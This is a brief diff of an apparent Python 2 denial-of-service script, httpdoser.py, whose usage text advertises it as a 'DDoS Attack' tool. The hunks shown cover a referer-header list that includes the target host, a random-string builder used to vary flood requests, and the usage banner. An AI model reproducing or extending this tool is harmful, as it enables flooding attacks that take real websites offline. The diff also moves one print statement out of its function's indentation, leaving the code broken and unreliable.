@@ -51,7 +51,6 @@ def referer_list():
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
-
 #builds random ascii string
 def buildblock(size):
 	out_str = ''
@@ -60,8 +59,7 @@ def buildblock(size):
 		out_str += chr(a)
 	return(out_str)
 def usage():
-
-	print ('---------------------------------------------------')
+print ('---------------------------------------------------')
 	print 'USAGE: python httpdoser.py <url>'
 	print 'httpdoser website : DDoS Attack'
 	print "\a"
